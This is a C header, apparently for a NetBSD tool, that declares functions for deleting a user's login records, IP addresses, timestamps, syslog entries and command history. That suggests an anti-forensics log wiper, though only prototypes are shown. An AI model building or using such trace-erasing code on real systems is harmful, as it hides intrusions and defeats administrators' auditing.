


//#define _NETBSD_SOURCE 

#define _X86_PMAP_H_

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <err.h>
#include <errno.h>

#include <kvm.h>
#include <sys/param.h>
#include <sys/sysctl.h>
#include <sys/proc.h>

#include <sys/types.h>
#include <sys/mman.h>

#include <uvm/uvm_extern.h>
#include <uvm/uvm_map.h>

#include <nlist.h>

#include <machine/pte.h>
#include <machine/vmparam.h>
#include <machine/param.h>

#define SEARCH_ITEM_LIMIT	16
#define TERMINAL_BUF_SIZE 	64

#define FILE_BUFFER_SIZE 	0x4000000

#define READ_FILE_DELAY		(1000*10)		//download speed and cpu rate


typedef int (*GetStringHdr_cb)(char*, char*,unsigned long * );

int DeleteUser(char * username);

int DeleteAddr(char * ip);

int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],GetStringHdr_cb *func );

int DeleteDateTime(char * strParam);

int MakeLoginTag(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],
char str[SEARCH_ITEM_LIMIT][256],int *strSize);

char* PartialCompare(char * hdr,int hdrLen, char sep, char * tail,int tailLen, char * data,int dLen);

char * ParseLogTail(char * data,char * end);

char* ParseSyslogHeader(char * data,char * end);

char * getLineHeader(char * data);

char * getLineEnder(char * data);

int DeleteHistory(char * username);

int ParseLogHeader(char * data,char * begin,unsigned long * value);

int ParseCommandHistoryHeader(char * data,char * begin,unsigned long * value);


int ParseDummy(char * data,char * begin,unsigned long * value);